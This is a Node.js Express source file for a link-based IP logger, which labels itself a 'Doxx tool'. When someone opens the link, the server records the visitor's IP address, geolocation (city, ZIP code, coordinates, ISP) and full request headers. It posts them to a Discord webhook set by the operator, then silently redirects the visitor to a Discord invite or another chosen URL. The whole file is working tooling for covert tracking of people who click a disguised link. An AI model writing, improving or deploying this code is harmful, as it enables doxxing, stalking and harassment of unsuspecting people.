const express = require('express');
const axios = require('axios');
require('dotenv').config(); 
const os = require('os'); 

const app = express();
const PORT = process.env.PORT || 3000;


const discordWebhookUrl = 'PUT YOURE WEBHOOK IN HERE';


const getGeolocation = async (ip) => {
    try {
        const response = await axios.get(`http://ip-api.com/json/${ip}`);
        return response.data;
    } catch (error) {
        console.error('Error fetching geolocation data:', error);
        return null;
    }
};


const getPublicIP = async () => {
    try {
        const response = await axios.get('https://api.ipify.org?format=json');
        return response.data.ip;
    } catch (error) {
        console.error('Error fetching public IP:', error);
        return null;
    }
};


const getServerInfo = () => {
    return {
        osType: os.type(),
        osRelease: os.release(),
        osPlatform: os.platform(),
        cpuCores: os.cpus().length,
        totalMemory: os.totalmem(),
        freeMemory: os.freemem(),
        uptime: os.uptime(),
    };
};


app.get('/', async (req, res) => {
    let ip = req.headers['x-forwarded-for'] ? req.headers['x-forwarded-for'].split(',')[0].trim() : req.connection.remoteAddress;


    if (ip.startsWith('10.') || ip.startsWith('192.168.') || ip.startsWith('172.16.') || ip.startsWith('172.31.') || !ip) {
        ip = await getPublicIP();
    }

    const discordUserId = req.query.user || 'https://discord.gg/KqjCGkU';
    const redirectUrl = req.query.redirect || 'https://discord.gg/KqjCGkU';
    const serverInfo = getServerInfo();


    const clientMetadata = {
        userAgent: req.headers['user-agent'],
        referrer: req.headers['referer'] || 'None',
        acceptLanguage: req.headers['accept-language'],
        encoding: req.headers['accept-encoding'],
        connection: req.headers['connection'],
        accept: req.headers['accept'],
        protocol: req.protocol,
    };


    const geoData = await getGeolocation(ip);
    const timestamp = new Date().toISOString();

    const fullData = {
        timestamp,
        discordUserId,
        ip,
        clientMetadata,
        serverInfo,
        geoData,
        headers: req.headers,
        queryParams: req.query,
    };

    console.log('Collected Data:', fullData);


    axios.post(discordWebhookUrl, {
        content: `New click recorded at ${timestamp}!
Doxx tool by: ${discordUserId}
IP: ${ip}

**Client Metadata**:
User-Agent: ${clientMetadata.userAgent}

**Geolocation API Response**:
Country: ${geoData?.country || 'Unknown'}
Region: ${geoData?.regionName || 'Unknown'}
City: ${geoData?.city || 'Unknown'}
ZIP: ${geoData?.zip || 'Unknown'}
Latitude: ${geoData?.lat || 'Unknown'}
Longitude: ${geoData?.lon || 'Unknown'}
Timezone: ${geoData?.timezone || 'Unknown'}
ISP: ${geoData?.isp || 'Unknown'}

**Server Info**:
OS Type: ${serverInfo.osType}
OS Platform: ${serverInfo.osPlatform}
OS Release: ${serverInfo.osRelease}
CPU Cores: ${serverInfo.cpuCores}
Total Memory: ${serverInfo.totalMemory / (1024 * 1024)} MB
Free Memory: ${serverInfo.freeMemory / (1024 * 1024)} MB
Uptime: ${serverInfo.uptime} seconds

**Headers Received**:
${JSON.stringify(req.headers, null, 2)}

**Query Parameters**:
${JSON.stringify(req.query, null, 2)}

Click log successful!`,
    }).then(() => {
        console.log('Click logged and data sent to Discord');
    }).catch(err => {
        console.error('Error sending data to Discord:', err);
    });


    res.redirect(redirectUrl);
});

app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});
